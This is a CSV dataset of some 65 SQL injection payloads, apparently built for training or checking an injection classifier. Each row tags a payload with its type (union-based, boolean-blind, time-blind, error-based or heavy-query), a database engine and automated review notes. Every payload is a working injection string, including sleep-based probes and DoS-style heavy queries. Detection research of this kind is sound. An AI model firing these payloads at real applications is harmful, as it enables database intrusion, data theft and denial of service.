payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
1' ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( 'hgtg' = 'hgtg,error_based,oracle,0.9,utl_inaddr for Oracle error-based,KEEP,,error_based,oracle,1116,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,1' ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( 'hgtg' = 'hgtg
-8143 ) union all select 3014--,union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1117,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,-8143 ) union all select 3014--
"-3370"" ) union all select 7845,7845,7845,7845,7845,7845#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1118,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3370"" ) union all select 7845,7845,7845,7845,7845,7845#"
"-5109 ) ) ) or make_set ( 6627 = 7331,7331 ) and ( ( ( 9466 = 9466",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,1119,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-5109 ) ) ) or make_set ( 6627 = 7331,7331 ) and ( ( ( 9466 = 9466"
"1"" ) as saqy where 9704 = 9704 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1120,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1"" ) as saqy where 9704 = 9704 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --"
"-6754' ) where 8388 = 8388 union all select 8388,8388,8388,8388,8388--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1121,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6754' ) where 8388 = 8388 union all select 8388,8388,8388,8388,8388--"
"-6073"" ) ) ) or 9502 = 2012#",boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,1122,boolean_blind,generic,Pattern match: 'or 9502 = 2012' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-6073"" ) ) ) or 9502 = 2012#"
"1' ) where 2443 = 2443 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1123,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1' ) where 2443 = 2443 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --"
"-7313"" ) where 3606 = 3606 union all select 3606#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1124,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7313"" ) where 3606 = 3606 union all select 3606#"
"1 ) and elt ( 7425 = 8842,8842 ) and ( 9194 = 9194",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,1125,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1 ) and elt ( 7425 = 8842,8842 ) and ( 9194 = 9194"
"-5644"" ) ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ( ""evcf"" = ""evcf",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,1126,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-5644"" ) ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ( ""evcf"" = ""evcf"
-2569' union all select 4484--,union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1127,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,-2569' union all select 4484--
"1"" ) ) ) and 7153 = 7474--",boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,1128,boolean_blind,generic,Pattern match: 'and 7153 = 7474' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","1"" ) ) ) and 7153 = 7474--"
"select pg_sleep ( 5 ) and ( ""pjql"" like ""pjql",time_blind,postgresql,0.9,pg_sleep() for time blind,KEEP,,time_blind,postgresql,1129,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,"select pg_sleep ( 5 ) and ( ""pjql"" like ""pjql"
"1%' union all select null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1130,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%' union all select null,null,null,null,null#"
"1"" ) where 1793 = 1793",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1131,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) where 1793 = 1793"
"1%' ) union all select null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1132,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%' ) union all select null,null,null,null,null,null#"
"-4535' ) union all select 8491,8491,8491,8491,8491,8491--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1133,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-4535' ) union all select 8491,8491,8491,8491,8491,8491--"
"1%' ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( '%' = '",error_based,mysql,0.85,extractvalue() with procedure analyse,KEEP,,error_based,mysql,1134,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1%' ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( '%' = '"
1' and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and 'lqsa' like 'lqsa,time_blind,postgresql,0.9,pg_sleep() for time blind,KEEP,,time_blind,postgresql,1135,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,1' and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and 'lqsa' like 'lqsa
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 'gsdq' = 'gsdq",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1136,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 'gsdq' = 'gsdq"
"1%' ) ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,randomblob() for time blind,KEEP,,time_blind,sqlite,1137,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1%' ) ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --"
"-1684"" ) ) ) union all select 7473,7473#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1138,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1684"" ) ) ) union all select 7473,7473#"
"-7683"" ) where 9664 = 9664 union all select 9664,9664,9664,9664,9664,9664,9664#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1139,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7683"" ) where 9664 = 9664 union all select 9664,9664,9664,9664,9664,9664,9664#"
select sleep ( 5 ) and ( 'labj' = 'labj,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1140,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,select sleep ( 5 ) and ( 'labj' = 'labj
"-4592"" ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ""xvpz"" = ""xvpz",error_based,oracle,0.9,utl_inaddr for Oracle error-based,KEEP,,error_based,oracle,1141,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,"-4592"" ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ""xvpz"" = ""xvpz"
-5547' or 9323 = 9323#,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1142,boolean_blind,generic,Pattern match: 'or 9323 = 9323' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-5547' or 9323 = 9323#
"1 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) -- zozj",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1143,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) -- zozj"
"-4641"" ) where 4212 = 4212 or make_set ( 3595 = 4062,4062 ) --",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,1144,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-4641"" ) where 4212 = 4212 or make_set ( 3595 = 4062,4062 ) --"
"1"" ) ) ) or sleep ( 5 ) and ( ( ( ""eran"" = ""eran",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1145,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1"" ) ) ) or sleep ( 5 ) and ( ( ( ""eran"" = ""eran"
"1"" or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) )",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1146,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1"" or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) )"
"-1558 or elt ( 3306 = 2272,2272 ) -- ioxt",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,1147,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"-1558 or elt ( 3306 = 2272,2272 ) -- ioxt"
"1 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) -- zimf",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1148,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) -- zimf"
1 ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ),boolean_blind,firebird,0.8,Case when for Firebird blind,KEEP,,boolean_blind,firebird,1149,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,1 ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )
"( convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 9339 = 9339 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) )",boolean_blind,mssql,0.8,CONVERT for MSSQL blind,KEEP,,boolean_blind,mssql,1150,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"( convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 9339 = 9339 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) )"
1'|| ( select 'oxas' from dual where 8284 = 8284 or sleep ( 5 ) ) ||',time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1151,time_blind,oracle,Pattern match: 'sleep (' → time_blind (P5); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal,1'|| ( select 'oxas' from dual where 8284 = 8284 or sleep ( 5 ) ) ||'
select case when 3076 = 1605 then 1 else null end--,boolean_blind,generic,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,generic,1152,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select case when 3076 = 1605 then 1 else null end--
1' where 6116 = 6116,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1153,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' where 6116 = 6116
"1%"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ""%"" = """,boolean_blind,postgresql,0.8,CAST for PostgreSQL blind,KEEP,,boolean_blind,postgresql,1154,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1%"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ""%"" = """
"-1641'|| ( select 'jfnu' where 7682 = 7682 union all select 7682,7682,7682--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1155,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1641'|| ( select 'jfnu' where 7682 = 7682 union all select 7682,7682,7682--"
1' in boolean mode ) waitfor delay '0:0:5'#,time_blind,mssql,0.9,waitfor delay for time blind,KEEP,,time_blind,mssql,1156,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,1' in boolean mode ) waitfor delay '0:0:5'#
1' where 1623 = 1623,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1157,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' where 1623 = 1623
1 where 2060 = 2060,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1158,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 where 2060 = 2060
"1 ) ) as bwrg where 3254 = 3254 union all select null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1159,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) ) as bwrg where 3254 = 3254 union all select null,null,null,null,null,null--"
"1%' union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1160,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%' union all select null,null,null,null,null,null,null,null,null--"
1' and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and 'pnpx' = 'pnpx,boolean_blind,firebird,0.8,Case when for Firebird blind,KEEP,,boolean_blind,firebird,1161,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,1' and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and 'pnpx' = 'pnpx
-6217 ) ) as hyws where 3441 = 3441 or 9421 = 4695#,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,1162,boolean_blind,generic,Pattern match: 'or 9421 = 4695' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-6217 ) ) as hyws where 3441 = 3441 or 9421 = 4695#
select pg_sleep ( 5 ) and ( 'aydg' = 'aydg,time_blind,postgresql,0.9,pg_sleep() for time blind,KEEP,,time_blind,postgresql,1163,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,select pg_sleep ( 5 ) and ( 'aydg' = 'aydg
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( '%' = '",time_blind,sqlite,0.85,randomblob() for time blind,KEEP,,time_blind,sqlite,1164,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( '%' = '"
-2869' ) ) union all select 3216--,union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1165,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,-2869' ) ) union all select 3216--
1' ) ) as xqvq where 4816 = 4816 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.9,pg_sleep() for time blind,KEEP,,time_blind,postgresql,1166,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,1' ) ) as xqvq where 4816 = 4816 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --
1' ) where 8429 = 8429,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1167,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) where 8429 = 8429
"-2131"" or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""wpsf"" like ""wpsf",boolean_blind,generic,0.8,IN with char for blind,KEEP,,boolean_blind,generic,1168,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-2131"" or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""wpsf"" like ""wpsf"
"-3885 ) where 2387 = 2387 union all select 2387,2387,2387,2387,2387,2387,2387#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1169,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3885 ) where 2387 = 2387 union all select 2387,2387,2387,2387,2387,2387,2387#"
"1"" ) ) as hwlh where 1071 = 1071 union all select null,null,null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1170,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" ) ) as hwlh where 1071 = 1071 union all select null,null,null,null,null,null,null,null#"
"1"" ) ) as oiqr where 4073 = 4073 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1171,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1"" ) ) as oiqr where 4073 = 4073 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --"
"1'+ ( select 'igoi' where 7823 = 7823 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) ) +'",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1172,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1'+ ( select 'igoi' where 7823 = 7823 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) ) +'"
"1' ) and elt ( 4249 = 4249,7259 )",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,1173,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1' ) and elt ( 4249 = 4249,7259 )"
1' in boolean mode ) and 5981 = 6700,boolean_blind,generic,0.8,AND comparison for blind,KEEP,,boolean_blind,generic,1174,boolean_blind,generic,Pattern match: 'and 5981 = 6700' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1' in boolean mode ) and 5981 = 6700
"1%"" ) ) rlike sleep ( 5 ) #",time_blind,generic,0.9,sleep() with rlike for time blind,KEEP,,time_blind,generic,1175,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)","1%"" ) ) rlike sleep ( 5 ) #"
"-8369"" ) ) union all select 2191--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1176,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-8369"" ) ) union all select 2191--"
"1' ) ) ) union all select null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1177,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) ) ) union all select null,null,null,null,null#"
"1"" ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ""ilrk"" = ""ilrk",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1178,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1"" ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ""ilrk"" = ""ilrk"
"1%"" ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,1179,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1%"" ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --"
1' ) and ( 1471 = 7892 ) *7892 and ( 'kkok' like 'kkok,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1180,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,1' ) and ( 1471 = 7892 ) *7892 and ( 'kkok' like 'kkok
"1'+ ( select vlut where 9517 = 9517 union all select null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1181,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1'+ ( select vlut where 9517 = 9517 union all select null,null,null--"
